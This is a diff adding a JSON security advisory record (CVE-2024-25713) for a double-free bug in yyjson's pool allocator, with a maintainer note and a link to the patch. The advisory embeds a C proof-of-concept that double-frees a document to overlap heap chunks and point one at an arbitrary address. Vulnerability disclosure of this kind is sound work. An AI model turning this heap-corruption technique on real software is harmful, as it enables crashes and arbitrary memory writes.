@@ -1,0 +1,81 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-whx6-m9j4-w2m2",
+  "modified": "2024-08-29T18:04:24Z",
+  "published": "2024-02-29T03:33:18Z",
+  "aliases": [
+    "CVE-2024-25713"
+  ],
+  "summary": "yyjson has a Double Free vulnerability",
+  "details": "### Summary\n\nThe pool series allocator (pool_malloc/pool_free/pool_realloc) by yysjon has a Double Free vulnerability, which may lead to arbitrary address writing and Denial of Service (DoS) attacks.\nArbitrary address writing, combined with other legitimate or illegitimate operations of programs using this library, can lead to remote code execution.\n\n### Details\n\nThe core cause of this vulnerability lies in the pool_free function's lack of loop checks, while the direct cause stems from the pool_free function and similar free-series functions not performing pointer destruction, resulting in Use-After-Free (UAF) vulnerabilities.\n\n### PoC\n\nBelow, a C language program using yyjson 0.8.0 is written to show how to exploit a Double Free vulnerability to cause chunk overlaps, which then allows the modification of a chunk's next pointer to point to an arbitrary address. If the targeted address is valid, modifications can be made. However, if the address is invalid, it could lead to the program crashing, which could be exploited for a Denial of Service (DoS) attack. Additionally, constructing a cyclic chain of chunks could force the service into an infinite loop, also exploitable for a DoS attack.\n\n```\n#include <stdio.h>\n#include \"yyjson.h\"\n\nchar test[0x110];\nint64_t a=0xffffffff;\nint64_t b= (int64_t) test;\n\nint main() {\n\n    size_t max_json_size = 64 * 1024;\n\n    size_t buf_size = yyjson_read_max_memory_usage(max_json_size, 0);\n\n    void *buf = malloc(buf_size);\n\n    yyjson_alc alc;\n    yyjson_alc_pool_init(&alc, buf, buf_size);\n\n    yyjson_mut_doc *p1 = yyjson_mut_doc_new(&alc);\n    yyjson_mut_doc *p2 = yyjson_mut_doc_new(&alc);\n    yyjson_mut_arr(p2);\n\n    yyjson_mut_doc *p3 = yyjson_mut_doc_new(&alc);\n\n    yyjson_mut_doc_free(p2);\n    yyjson_mut_doc_free(p2); // double free\n    yyjson_mut_doc_free(p1);\n\n    yyjson_read_flag flg = YYJSON_READ_ALLOW_COMMENTS | YYJSON_READ_ALLOW_INF_AND_NAN;\n\n\n    for(int i=0;i<0x100;i++)test[i]= 'a';\n    test[0x100]='\\00';\n    char *payload_f = \"[%lld,43981]\";\n\n    char payload[100];\n    sprintf(payload,payload_f,&a);\n    yyjson_mut_doc *p4 = yyjson_read_opts(payload,strlen(payload),flg,&alc,NULL);\n\n    yyjson_mut_doc *p5 = yyjson_mut_doc_new(&alc);\n    yyjson_mut_doc *p6 = yyjson_mut_doc_new(&alc);\n    yyjson_mut_doc *p7 = yyjson_mut_doc_new(&alc);\n    yyjson_mut_doc *p8 = yyjson_mut_doc_new(&alc);\n    for(int z=1;z<=100;z++)\n    yyjson_mut_int(p8,0x63636363);\n\n    printf(\"%s\",test);\n    free(buf);\n    return 0;\n}\n```\n\n### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n## Note from yyjson\nyyjson_mut_doc_free() is well-documented:\nhttps://github.com/ibireme/yyjson/blob/0.8.0/src/yyjson.h#L2090-L2093\n\n```\n/** Release the JSON document and free the memory.\n    After calling this function, the `doc` and all values from the `doc` are no\n    longer available. This function will do nothing if the `doc` is NULL.  */\nvoid yyjson_mut_doc_free(yyjson_doc *doc);\n```\nIf you have already called yyjson_mut_doc_free() on a doc, the doc and its internal values are invalid.\nAny further operation on the doc or its values is undefined behavior.\n\nWhile this is not a bug in yyjson itself, a defensive patch has been provided: [0eca326](https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e)\nIf you mistakenly call yyjson_mut_doc_free() twice on the same doc against the documentation,\nthis patch will cause your program to crash immediately, alerting you to the incorrect usage.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "SwiftURL",
+        "name": "github.com/ibireme/yyjson"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.9.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/ibireme/yyjson/security/advisories/GHSA-q4m7-9pcm-fpxh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-25713"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/ibireme/yyjson"
+    },
+    {
+      "type": "WEB",
+      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6KQ67T4R7QEWURW5NMCCVLTBASL4ECHE"
+    },
+    {
+      "type": "WEB",
+      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NNICQVIF7BRYFWYRL3HPVAJIPXN4OVTX"
+    },
+    {
+      "type": "WEB",
+      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TKQPEREDUDKGYJMFNFDQVYCVLWDRO2Y2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-08-29T18:04:24Z",
+    "nvd_published_at": "2024-02-29T01:44:16Z"
+  }
+}
